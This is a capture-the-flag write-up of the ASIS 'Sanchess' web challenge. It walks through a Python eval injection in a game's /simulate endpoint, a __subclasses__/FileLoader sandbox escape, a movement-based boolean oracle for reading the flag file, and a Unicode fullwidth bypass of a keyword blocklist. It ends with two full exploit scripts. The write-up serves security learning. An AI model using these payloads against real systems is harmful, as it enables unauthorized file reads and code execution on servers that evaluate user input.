---
tags:
  - web
  - asis-ctf
---

# Sanchess - Making Rick Angry

**Category:** Web Exploitation
**Flag:** `ASIS{y0u_M2D3_r!cK_@NGRY}`

## First Impressions

The challenge description was cryptic: "Guide Rick through the shadows to discover Morty, armed only with peculiar tools." When I loaded the page, I found a Rick and Morty themed chess-like game. Rick stood on one corner of an 8x8 board, and Morty was somewhere else. My job was to program Rick's moves to reach Morty.

What made it interesting was the move system. I could create simple moves like "up" or "down", but I could also create conditional moves - if some condition was true, move in one direction, otherwise move in another direction. The conditions could check things like the distance to Morty or the color of the current cell.

## Finding the Injection

I started poking at the `/simulate` endpoint, which accepted JSON describing Rick's moves. The conditional moves were particularly interesting because they had a `value` field that was compared against the calculated distance.

I tried a simple test:
```python
{"type": "distance", "op": ">", "value": "1+1"}
```

Rick moved! The server had evaluated `1+1` to `2` and compared the distance against it. This was Python expression injection - I could make the server evaluate arbitrary Python code.

I tested what functions were available:
```python
{"type": "distance", "op": ">", "value": "len('hello')"}  # Works - evaluates to 5
{"type": "distance", "op": ">", "value": "int('10')"}     # Works - evaluates to 10
```

But when I tried dangerous functions like `open()` or `__import__()`, they were blocked. The application had some kind of filter or sandbox.

## Breaking Out

Since I couldn't use `open()` directly, I needed to find another way to read files. Python's class hierarchy is famous for sandbox escapes. Every object in Python inherits from a base class, and by traversing the subclasses, you can sometimes find dangerous functionality that wasn't explicitly blocked.

I tried this expression:
```python
().__class__.__base__.__subclasses__()
```

This gave me access to all loaded Python classes. I scrolled through them looking for something useful. Then I found it: `FileLoader`. This is a class from Python's import system, and it has a `get_data()` method that can read files.

The expression looked like this:
```python
[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='FileLoader'][0]('flag.txt','flag.txt').get_data('flag.txt')
```

This found the FileLoader class, instantiated it, and called `get_data()` to read the flag file. But I couldn't just read the flag directly - I needed to extract it one character at a time using a boolean oracle.

## The Boolean Oracle

The challenge used Manhattan distance to calculate how far Rick was from Morty. With Rick at position (0,0) and Morty at (7,1), the distance was 8.

When I created a conditional move with `distance > value`, the server would:
- Move Rick DOWN if the condition was TRUE (distance > value)
- Move Rick UP if the condition was FALSE (distance <= value)

So I could tell if my expression evaluated to less than 8 or not by watching which direction Rick moved.

My strategy was to read one character of the flag at a time and multiply the comparison result by 100:
```python
(flag_bytes[position] == ascii_code) * 100
```

If the character matched, this would evaluate to 100, and `8 > 100` would be FALSE (Rick moves UP).
If the character didn't match, this would evaluate to 0, and `8 > 0` would be TRUE (Rick moves DOWN).

So Rick moving UP meant I found the right character.

## The First Flag

I wrote a Python script to automate the extraction:

```python
def check_char(pos, char_code):
    byte_expr = "[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='FileLoader'][0]('flag.txt','flag.txt').get_data('flag.txt')"
    expr = f"({byte_expr}[{pos}]=={char_code})*100"

    payload = {
        "rick": {"row": 0, "col": 0},
        "morty": {"row": 7, "col": 1},
        "moves": [{
            "type": "conditional",
            "condition": {"type": "distance", "op": ">", "value": expr},
            "then": "down",
            "else": "up"
        }]
    }

    r = session.post(f"{BASE_URL}/simulate", json=payload)
    path = r.json().get("path", [])

    # UP (row stays 0) means match found
    return path[1]['row'] == 0
```

I ran it and watched the flag appear character by character:
```
A
AS
ASI
ASIS
ASIS{
ASIS{y
ASIS{y0
...
ASIS{y0u_M2D3_r!cK_@NGRY}
```

Perfect. But then something changed.

## The Patch

The challenge organizers patched it mid-competition. They added filters to block keywords like "open", "read", "flag", "eval", and even underscores. My FileLoader approach no longer worked.

I was stuck for a while. Then I remembered something I'd read about Unicode normalization attacks.

## Unicode Normalization Bypass

Many web frameworks normalize Unicode characters before processing them. There's a range of Unicode characters called "fullwidth" characters (U+FF01 to U+FF5E) that look slightly different but normalize to regular ASCII.

For example:
- `ｏｐｅｎ` (fullwidth) normalizes to `open` (ASCII)
- `ｒｅａｄ` (fullwidth) normalizes to `read` (ASCII)

The key insight: the filter checked for "open" and "read" before normalization, but Python evaluated the expression after normalization.

I wrote a function to convert ASCII to fullwidth:
```python
def to_fullwidth(s):
    res = ""
    for char in s:
        code = ord(char)
        if 33 <= code <= 126:
            res += chr(code + 0xFEE0)  # Shift to fullwidth
        else:
            res += char
    return res
```

Now I could bypass the filters:
```python
func_open = to_fullwidth("open")   # ｏｐｅｎ
func_read = to_fullwidth("read")   # ｒｅａｄ
fname = "'fl'+'ag.txt'"             # Bypass "flag" filter with concatenation

payload_expr = f"{func_open}({fname}).{func_read}()[{pos}] == '{char}'"
```

The filter saw `ｏｐｅｎ` and `ｒｅａｄ` - which didn't match its blocklist of "open" and "read". But after normalization, Python executed `open('fl'+'ag.txt').read()` which worked perfectly.

## Getting the Flag Again

I updated my script with the Unicode bypass and ran it again. This time it worked even with the filters in place:

```
[*] Starting Unicode Normalization Bypass...
[+] Flag: A
[+] Flag: AS
[+] Flag: ASI
...
[+] Flag: ASIS{y0u_M2D3_r!cK_@NGRY}

Final Flag: ASIS{y0u_M2D3_r!cK_@NGRY}
```

The flag translates to "you made Rick angry" - fitting, given how much time I spent on this challenge.

## Exploit Scripts

### Pre-Patch Version

```python
#!/usr/bin/env python3
import requests
import string
import time

BASE_URL = "http://65.109.194.105:9090"
SESSION = requests.Session()

def test_expr(expr, distance=8):
    morty_row = min(distance, 7)
    morty_col = max(0, distance - 7)

    payload = {
        "rick": {"row": 0, "col": 0},
        "morty": {"row": morty_row, "col": morty_col},
        "moves": [{
            "type": "conditional",
            "condition": {"type": "distance", "op": ">", "value": expr},
            "then": "down",
            "else": "up"
        }]
    }

    try:
        r = SESSION.post(f"{BASE_URL}/simulate", json=payload, timeout=10)
        data = r.json()
        if "Error" in data:
            return None
        path = data.get("path", [])
        if len(path) >= 2:
            return path[1]["row"] > path[0]["row"]
        return None
    except:
        return None

def check_char(pos, char_code):
    byte_expr = "[c for c in ().__class__.__base__.__subclasses__() if c.__name__=='FileLoader'][0]('flag.txt','flag.txt').get_data('flag.txt')"
    expr = f"({byte_expr}[{pos}]=={char_code})*100"
    result = test_expr(expr)

    if result is None:
        return None
    return result == False  # False means match

def extract_flag():
    charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + "_{}-!@#$%^&*()."
    flag = ""

    print("[*] Extracting flag...")

    for pos in range(100):
        found = False
        for char in charset:
            if check_char(pos, ord(char)):
                flag += char
                print(f"    [{pos}] '{char}' -> {flag}")
                found = True
                break
            time.sleep(0.02)

        if not found:
            print(f"    [{pos}] No match found - END")
            break

        if char == '}':
            print("\n[+] Flag complete!")
            break

    return flag

if __name__ == "__main__":
    flag = extract_flag()
    print(f"\nFLAG: {flag}")
```

### Post-Patch Version (Unicode Bypass)

```python
#!/usr/bin/env python3
import requests
import sys

BASE_URL = "http://65.109.194.105:9090/"
SESSION = requests.Session()

def to_fullwidth(s):
    res = ""
    for char in s:
        code = ord(char)
        if 33 <= code <= 126:
            res += chr(code + 0xFEE0)
        else:
            res += char
    return res

def send_move(payload_expr):
    final_payload = f"({payload_expr}) * 100"

    json_body = {
        "rick": {"row": 0, "col": 0},
        "morty": {"row": 7, "col": 1},
        "moves": [{
            "type": "conditional",
            "condition": {"type": "distance", "op": ">", "value": final_payload},
            "then": "down",
            "else": "up"
        }]
    }

    try:
        r = SESSION.post(f"{BASE_URL}/simulate", json=json_body, timeout=5)
        if r.status_code != 200:
            return None
        data = r.json()
        if "error" in data or not data.get("path"):
            return None

        path = data["path"]
        if len(path) < 2:
            return None

        # UP (Row stays 0) = MATCH
        if path[1]['row'] == 0:
            return True
        else:
            return False
    except Exception:
        return None

def brute_force_flag():
    print("[*] Starting Unicode Normalization Bypass...")

    func_open = to_fullwidth("open")
    func_read = to_fullwidth("read")
    fname = "'fl'+'ag.txt'"

    print(f"[*] Payload Template: {func_open}({fname}).{func_read}()[pos]")

    flag = ""
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-!?"

    for pos in range(0, 50):
        found = False
        sys.stdout.write(f"\r[{pos}] ")

        for char in charset:
            safe_char = char
            if char == "'":
                safe_char = "\\'"

            expr = f"{func_open}({fname}).{func_read}()[{pos}] == '{safe_char}'"

            res = send_move(expr)

            if res is True:
                flag += char
                print(f"\r[+] Flag: {flag}                 ")
                found = True
                break

        if not found:
            print(f"\n[!] Stalled at position {pos}. End of flag?")
            break

    print(f"\nFinal Flag: {flag}")

if __name__ == "__main__":
    brute_force_flag()
```

## References

- [Python Sandbox Escape Techniques](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
- [Unicode Normalization Attacks](https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/)
- [Fullwidth Unicode Characters](https://en.wikipedia.org/wiki/Halfwidth_and_Fullwidth_Forms_(Unicode_block))
